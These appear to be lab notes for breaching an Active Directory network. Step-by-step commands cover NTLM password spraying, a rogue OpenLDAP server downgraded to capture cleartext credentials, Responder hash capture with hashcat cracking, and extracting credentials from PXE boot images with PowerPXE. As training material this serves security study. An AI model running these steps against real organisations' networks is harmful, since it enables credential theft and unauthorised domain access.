# Tools used:

 - `python ntlm_passwordspray.py`
 - `OpenLDAP`
 -  `responder`
 -  `hashcat`
 -  `powerPxe.ps1`

# Password sparying

For password spraying we can use many different tools like Hydry. For this task we will `ntlm_passwordspray.py`.

| Description                                    | Command                                                                                |
| :---                                           | :---                                                                                   |
| Find which user a specific password belongs to | `python ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>`    |


# LDAP (PORT 389)

## Hosting rogue LDAP Server
There are several ways to host a rogue LDAP server, but we will use OpenLDAP.

Install OpenLDAP
 > sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd

Configure the LDAP
> sudo dpkg-reconfigure -p low slapd

Configuration step:
1. Press `No` for server configuration
2. Enter the traget domain name for `DNS Domain Name`
3. Enter target domain name for `Organization Name`
4. Provide any admin password
5. Select `MDB` as the LDAP database to use
6. Ensure database is removed when purged
7. Move old database before creating new database

Downgrade LDAP to make it vulnerable so that the LDAP server only supports PLAIN and LOGIN authentication methods. To do this creata a `ldif` file.
```config
#olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```

| Varioable         | Description                                                                         |
| :---              | :---                                                                                |
| `olcSaslSecProps` | Specifies the SASL security properties                                              |
| `noanonymous`     | Disables mechanisms that support anonymous login                                    |        
| `minssf`          | Specifies the minimum acceptable security strength with 0, meaning no protection.   |

Verify if the config has applied:
> ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms

Now we can use the ldif file to patch our LDAP server using the following
> sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart

Capture the LDAP credential
> sudo tcpdump -SX -i breachad tcp port 389

# Intercepting NetNTLM Challenge
Set Responder to run on iterface connected to VPN or your IP. Make sure you specify `tun0` or `tun1` depending on which tunnel has your network IP

> sudo responder -I tun0

Example output:
```terminal
[+] Listening for events...
[SMBv2] NTLMv2-SSP Client   : <Client IP>
[SMBv2] NTLMv2-SSP Username : ZA\<Service Account Username>
[SMBv2] NTLMv2-SSP Hash     : <Service Account Username>::ZA:<NTLMv2-SSP Hash>
```
Once we have a few responses, we can start to perform some offline cracking of the responses in the hopes of recovering their associated NTLM passwords. Use `Hashcat` to crack the password.
> hashcat -m 5600 <hash file> <password file> --force

# Microsoft Deployment Toolkit (MDT) 
Microsoft Deployment Toolkit (MDT) is a Microsoft service that assists with automating the deployment of Microsoft Operating Systems (OS). We will focus exclusively on a configuration called Preboot Execution Environment (PXE) boot. Large organisations use PXE boot to allow new devices that are connected to the network to load and install the OS directly over a network connection. MDT can be used to create, manage, and host PXE boot images.
  
We can exploit the PXE boot image for two different purposes:
 - Inject a privilege escalation vector, such as a Local Administrator account, to gain Administrative access to the OS once the PXE boot has been completed.
 - Perform password scraping attacks to recover AD credentials used during the install.

## PXE Boot Image Retrieval
Download the BCD file to read the configuration of the MDT server
> tftp -i <MDT_IP> GET "\Tmp\x64{39...28}.bcd" conf.bcd
  
Use `powerPxe` to read the BCD file content
> powershell -executionpolicy bypasss
> Import-Module .\PowerPXE.ps1
> $BCDFile = "conf.bcd"
> Get-WimFile -bcdFile $BCDFile

Use tftp to download the bootable image
> tftp -i <MDT_IP> GET "<PXE Boot Image Location>" pxeboot.wim

Exfiltrate stored credentials  
> Get-FindCredentials -WimFile pxeboot.wim
  
_Note: We can use other methods to exploit the bootable image like create local admin, have a domain-joined machine and many more._

  
